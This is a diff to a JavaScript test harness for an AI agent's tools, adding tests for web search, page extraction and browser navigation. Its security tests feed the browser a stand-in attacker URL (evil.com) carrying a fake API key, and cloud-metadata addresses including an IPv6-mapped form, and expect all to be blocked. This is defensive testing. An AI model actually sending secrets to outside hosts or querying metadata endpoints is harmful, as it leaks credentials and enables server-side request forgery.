@@ -14,6 +14,7 @@ const tools = await import("../packages/tools/dist/index.js");
 const {
   readTool, writeTool, editTool, lsTool, findTool, grepTool, globTool, bashTool, replaceTool,
 } = tools;
+const { browserNavigateTool, webSearchTool, webExtractTool } = tools;
 const { semanticSearch, _setCodeIndexDbPath } = await import("../packages/memory/dist/code-index.js");
 const { runWorkflowSource } = await import("../packages/workflows/dist/runner.js");
 const { repair } = await import("../packages/tools/dist/repair.js");
@@ -320,8 +321,39 @@ async function testHashlineEditReal() {
   record("hashline_edit", "duplicate lines → unique hashes (no ambiguity)", dup[0] !== dup[1], `h0=${dup[0]} h1=${dup[1]}`);
 }
 
+// ── WEB (browser + search + extract + security + fallback) ────────────────
+async function testWeb() {
+  // web_search — ddgs zero-key floor always works (no API key needed)
+  const ws = await webSearchTool.run({ query: "node.js tutorial", limit: 3 }, undefined);
+  const wsOut = ws.output;
+  record("web_search", "ddgs floor returns results", ws.ok && Array.isArray(wsOut?.results) && wsOut.results.length > 0, `backend=${wsOut?.backend ?? "?"} n=${wsOut?.results?.length ?? 0}`);
+
+  // web_extract — no extract backend → web_fetch fallback returns markdown (arg is `url` singular)
+  const we = await webExtractTool.run({ url: "https://example.com/" }, undefined);
+  const weText = JSON.stringify(we.output ?? "");
+  record("web_extract", "web_fetch fallback returns content", we.ok && /Example Domain/i.test(weText), `ok=${we.ok}`);
+
+  // browser_navigate security: secret-in-URL → BLOCKED (exfil guard)
+  const sec = await browserNavigateTool.run({ url: "https://evil.com/?key=sk-ant-AAAABBBBCCCCDDDD" }, undefined);
+  record("browser_navigate", "secret-in-URL BLOCKED", sec.ok === false && /secret|credential/i.test(sec.error ?? ""), sec.error ?? "");
+
+  // browser_navigate security: cloud metadata → BLOCKED (unconditional floor)
+  const meta = await browserNavigateTool.run({ url: "http://169.254.169.254/latest/meta-data/" }, undefined);
+  record("browser_navigate", "cloud-metadata BLOCKED", meta.ok === false && /metadata|ssrf/i.test(meta.error ?? ""), meta.error ?? "");
+
+  // browser_navigate security: IPv6-mapped metadata → BLOCKED (Phase 5 fix)
+  const v6 = await browserNavigateTool.run({ url: "http://[::ffff:169.254.169.254]/" }, undefined);
+  record("browser_navigate", "IPv6-mapped metadata BLOCKED (::ffff:)", v6.ok === false && /metadata|ssrf/i.test(v6.error ?? ""), v6.error ?? "");
+
+  // browser_navigate happy: real page → ok (local snapshot OR web_fetch fallback — both valid)
+  const nav = await browserNavigateTool.run({ url: "https://example.com/", taskId: "harness-web" }, undefined);
+  const navOut = nav.output;
+  const navEngine = navOut?.engine;
+  record("browser_navigate", "happy navigate (local OR web_fetch fallback)", nav.ok && /Example Domain/i.test(JSON.stringify(navOut ?? "")), `engine=${navEngine ?? "?"}`);
+}
+
 // ── RUN ALL ─────────────────────────────────────────────────────────────────
-const suites = [testRead, testReadExtended, testWrite, testWriteExtended, testEdit, testLsFind, testGrepGlob, testGlobGrepExtended, testBash, testBashExtended, testReplace, testContainmentParity, testHashlineEditReal, testSemanticSearch, testWorkflow, testRepair, testMemoryRoundTrip, testDelegateContainment];
+const suites = [testRead, testReadExtended, testWrite, testWriteExtended, testEdit, testLsFind, testGrepGlob, testGlobGrepExtended, testBash, testBashExtended, testReplace, testContainmentParity, testHashlineEditReal, testSemanticSearch, testWorkflow, testRepair, testMemoryRoundTrip, testDelegateContainment, testWeb];
 for (const s of suites) {
   try { await s(); } catch (e) { record(s.name, "SUITE THREW", false, e.message); }
 }
